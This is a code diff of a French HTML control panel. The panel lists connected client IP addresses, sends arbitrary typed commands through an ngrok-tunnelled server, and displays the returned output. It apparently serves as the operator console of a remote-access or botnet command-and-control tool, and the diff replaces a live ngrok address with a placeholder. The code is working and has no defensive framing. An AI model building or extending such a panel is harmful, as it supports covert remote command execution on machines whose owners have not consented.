@@ -3,36 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Panel de Commande</title>
+    <title>Panel de Contrôle</title>
 </head>
 <body>
-    <h2>Envoyer une commande</h2>
-    <input type="text" id="commandInput" placeholder="Commande">
+    <h1>Panel de Contrôle</h1>
+
+    <h2>Clients Connectés</h2>
+    <ul id="client-list"></ul>
+
+    <h2>Envoyer une Commande</h2>
+    <input type="text" id="command" placeholder="Tapez une commande...">
     <button onclick="sendCommand()">Envoyer</button>
 
-    <h2>Résultat :</h2>
-    <pre id="resultOutput">Aucun résultat</pre>
+    <h2>Résultat</h2>
+    <pre id="output"></pre>
 
     <script>
-        const serverUrl = "https://a0d3-86-247-149-113.ngrok-free.app"; // 🔥 Mets l'IP de ton serveur
+        const serverUrl = "https://xxxx.ngrok-free.app"; // 🔥 Mets ton lien Ngrok ici
+
+        function updateClients() {
+            fetch(serverUrl + "/connected_clients")
+                .then(response => response.json())
+                .then(data => {
+                    let list = document.getElementById("client-list");
+                    list.innerHTML = ""; 
+
+                    data.connected_clients.forEach(ip => {
+                        let item = document.createElement("li");
+                        item.textContent = ip;
+                        list.appendChild(item);
+                    });
+                })
+                .catch(err => console.error("Erreur de connexion:", err));
+        }
 
         function sendCommand() {
-            const command = document.getElementById("commandInput").value;
-            fetch(`${serverUrl}/command`, {
+            const command = document.getElementById("command").value;
+            fetch(serverUrl + "/send_command", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ command: command })
-            }).then(response => response.json())
-              .then(data => console.log(data));
+            }).then(() => alert("Commande envoyée !"));
         }
 
         function getResult() {
-            fetch(`${serverUrl}/get_result`)
-                .then(response => response.json())
-                .then(data => document.getElementById("resultOutput").textContent = data.output);
+            fetch(serverUrl + "/result")
+                .then(response => response.text())
+                .then(data => {
+                    document.getElementById("output").textContent = data;
+                })
+                .catch(err => console.error("Erreur de récupération du résultat:", err));
         }
 
-        setInterval(getResult, 5000);  // 🔄 Met à jour le résultat toutes les 5 secondes
+        setInterval(updateClients, 5000);
     </script>
 </body>
 </html>
